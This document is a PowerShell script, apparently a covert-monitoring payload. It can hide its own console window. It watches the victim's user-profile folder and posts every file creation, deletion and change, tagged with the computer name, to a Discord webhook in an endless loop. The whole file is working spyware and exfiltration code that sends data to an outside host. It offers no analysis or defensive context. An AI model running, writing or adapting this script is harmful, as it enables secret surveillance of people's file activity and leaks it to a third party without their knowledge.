$whuri = "$dc"
if ($whuri.Length -lt 120){
	$whuri = ("https://discord.com/api/webhooks/" + "$dc")
}

# Uncomment $hide='y' below to hide the console

# $hide='y'
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w,0)
    }else{
        $Host.UI.RawUI.WindowTitle = 'xx'
        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
        $w=$p.MainWindowHandle
        $t::ShowWindowAsync($w,0)
    }
}


$watcher = New-Object System.IO.FileSystemWatcher -Property @{
    Path = $env:USERPROFILE + '\'
}
$watcher.NotifyFilter = [System.IO.NotifyFilters]::FileName -bor `
                        [System.IO.NotifyFilters]::LastWrite -bor `
                        [System.IO.NotifyFilters]::DirectoryName

$action = {
    $event = $EventArgs
    $path = $event.FullPath
    $changeType = $event.ChangeType
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    $msgsys = "[$timestamp] File $changeType > $path"
    $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
    Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys

}

Register-ObjectEvent -InputObject $watcher -EventName Created -Action $action
Register-ObjectEvent -InputObject $watcher -EventName Deleted -Action $action
Register-ObjectEvent -InputObject $watcher -EventName Changed -Action $action

$watcher.EnableRaisingEvents = $true

while ($true) {
    Start-Sleep -Milliseconds 500
}

Unregister-Event -InputObject $watcher -EventName Created -Action $action
Unregister-Event -InputObject $watcher -EventName Deleted -Action $action
Unregister-Event -InputObject $watcher -EventName Changed -Action $action
